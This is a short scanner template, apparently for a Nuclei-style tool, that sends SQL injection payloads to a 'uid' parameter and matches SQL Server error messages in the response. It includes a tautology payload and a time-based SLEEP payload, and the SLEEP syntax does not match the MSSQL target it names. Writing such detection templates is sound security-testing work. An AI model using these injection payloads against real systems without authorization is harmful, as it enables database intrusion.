id: sqli-mssql-10
name: 'SQLi error mssql via uid'
severity: high
type: active
tags:
  - sqli
  - injection
  - mssql
description: 'Triggers mssql error via uid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      uid:
        - '" OR "1"="1'
        - ''' AND SLEEP(5)--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ODBC'
          - 'SQL Server'
          - 'Unclosed quotation mark'
